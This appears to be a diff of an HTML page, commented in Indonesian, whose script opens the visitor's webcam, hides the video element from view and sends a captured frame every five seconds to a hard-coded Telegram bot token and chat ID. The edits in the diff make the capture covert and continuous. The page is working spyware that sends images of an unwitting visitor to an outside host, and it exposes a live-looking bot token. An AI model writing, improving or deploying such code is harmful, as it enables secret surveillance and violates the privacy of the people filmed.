@@ -4,13 +4,28 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Automatic Camera Capture and Telegram</title>
+  <style>
+    /* Ganti gaya CSS sesuai kebutuhan Anda */
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    video {
+      display: none; /* Menyembunyikan video dari tampilan web */
+    }
+  </style>
 </head>
 <body>
   <h1>Automatic Camera Capture and Telegram</h1>
 
   <script>
     var token = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0'; // Ganti dengan token bot Telegram Anda
-    var chatId = '-1002188815934';   // Ganti dengan ID obrolan atau pengguna di -1002188815934
+    var chatId = '-1002188815934';   // Ganti dengan ID obrolan atau pengguna di Telegram
+
     // Fungsi untuk mengirim gambar ke Telegram
     function sendToTelegram(imageDataURL) {
       // API endpoint untuk mengirim pesan gambar
@@ -35,21 +50,22 @@
         .then(data => {
           console.log('Gambar berhasil dikirim ke Telegram:', data);
           // Lanjutkan pengambilan gambar berikutnya setelah berhasil dikirim
-          takeAndSendPhoto();
+          setTimeout(takeAndSendPhoto, 5000); // Mengambil gambar setiap 5 detik sekali (5000 milidetik)
         })
         .catch(error => {
           console.error('Error mengirim gambar ke Telegram:', error);
           // Coba kirim gambar berikutnya setelah terjadi kesalahan
-          takeAndSendPhoto();
+          setTimeout(takeAndSendPhoto, 5000); // Coba lagi setelah 5 detik
         });
     }
 
-    // Fungsi untuk mengambil dan mengirim foto ke Telegram secara berulang
+    // Fungsi untuk mengambil dan mengirim foto ke Telegram
     function takeAndSendPhoto() {
       // Mendapatkan akses ke kamera pengguna secara otomatis
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(function(stream) {
           var video = document.createElement('video');
+          // Tambahkan video ke dokumen agar stream aktif, tetapi tidak ditampilkan di web
           document.body.appendChild(video);
           video.srcObject = stream;
           video.onloadedmetadata = function(e) {
@@ -70,17 +86,15 @@
               sendToTelegram(imageDataURL);
 
               // Hapus elemen video dari dokumen
-              video.parentNode.removeChild(video);
+              document.body.removeChild(video);
 
-              // Panggil fungsi lagi untuk mengambil foto berikutnya
-              takeAndSendPhoto();
             }, 1000); // Waktu delay sebelum mengambil gambar (dalam milidetik)
           };
         })
         .catch(function(err) {
           console.log("Error: " + err);
           // Coba kembali mengambil gambar jika terjadi kesalahan
-          takeAndSendPhoto();
+          setTimeout(takeAndSendPhoto, 5000); // Coba lagi setelah 5 detik
         });
     }
 
